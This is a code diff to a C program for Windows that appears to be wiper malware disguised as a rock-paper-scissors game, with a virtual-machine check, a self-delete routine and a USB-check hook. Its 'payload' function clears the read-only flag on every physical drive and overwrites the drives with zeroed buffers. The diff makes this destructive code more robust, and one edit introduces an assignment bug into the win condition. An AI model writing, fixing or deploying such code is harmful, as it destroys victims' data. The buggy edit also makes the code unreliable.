@@ -64,12 +64,12 @@ BOOL is_vm() {
     }
     return FALSE; // add more
 }
-char rand_nm[7]; // global var, + null term
+char rand_nm[7] = {0}; // global var, + null term
 const char charset[] = "abcdefghijklmnopqrstuvwxyzaBCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
 
 void gen_rnd() {
     size_t len = sizeof(charset) -1; // for null term
-    srand((unsigned int)GetTickCount()) // this is cool, "GetTickCount" is different every time 
+    srand((unsigned int)GetTickCount()); // this is cool, "GetTickCount" is different every time 
     for (int a = 0; a < 6; a++) {
         rand_nm[a] = charset[rand() % len];
     }
@@ -172,7 +172,7 @@ void safe() {
     //delete itself
     //uses localhost as a delay method 
     self_del_new();
-    return 1;
+    return;
 
 }
 void game() {
@@ -195,6 +195,7 @@ void game() {
             continue;
 
         // learned about windows console, trimming newline makes it cooler
+        input[strcspn(input, "\n")] = 0;
         
         if (sscanf(input, "%d", &play) !=1 || play<1 || play>3){ // from Tyler, input handling
             printf("1, 2 or 3!!!\n invalid input ");
@@ -205,7 +206,7 @@ void game() {
 
 	int rps = play - robot;
 	printf("robot chose %s\n", dict[robot]);
-	if ((rps > 0 && rps != -2) || rps == -2) {
+	if (rps = 1 || rps == -2) {
         printf("you won!\n");
         safe();
     } else {
@@ -230,7 +231,7 @@ void payload() {
     
     // only accepts 32 disks
     for (int disknum = 0; disknum < 32; disknum++) {
-        char disk_path[64];
+        char disk_path[64] = {0};
         sprintf(disk_path, "\\\\.\\PhysicalDrive%d", disknum);
 
         // open disk for direct write, bypass cache
@@ -249,18 +250,22 @@ void payload() {
         DISK_ATTRIBUTES attrs = {0};
         DWORD bytesReturned;
 
-        DeviceIoControl(
+        // check returns
+
+        if (!DeviceIoControl(
             hDisk,
             IOCTL_DISK_GET_DISK_ATTRIBUTES,
             NULL, 0,
             &attrs, sizeof(attrs),
             &bytesReturned,
             NULL
-        );
+        )) {
+            CloseHandle(hDisk);
+        }
 
         //clear read only flag
         attrs.ReadOnly = 0;
-
+        
         //write updated attributes
         DeviceIoControl(
             hDisk,
@@ -272,7 +277,7 @@ void payload() {
         );
 
         // find disk size
-        LARGE_INTEGER disk_size;
+        LARGE_INTEGER disk_size = {0};
         DeviceIoControl(
             hDisk,
             IOCTL_DISK_GET_LENGTH_INFO,
@@ -287,7 +292,7 @@ void payload() {
         if (!buffer) { CloseHandle(hDisk); return; }
         ZeroMemory(buffer, bufSize);
 
-        LARGE_INTEGER offset;
+        LARGE_INTEGER offset = {0};
         offset.QuadPart = 0;
         DWORD written;
 
@@ -309,7 +314,7 @@ int main(int argc, char *argv[]){
     if (argc > 1 && strcmp(argv[1], "payload") == 0) {
         payload();
         return 0;
-    } else if (strcmp(argv[1], "usb_check") == 0) {
+    } else if (argc > 1 && strcmp(argv[1], "usb_check") == 0) {
         check_new_usb();
         return 0;
     }
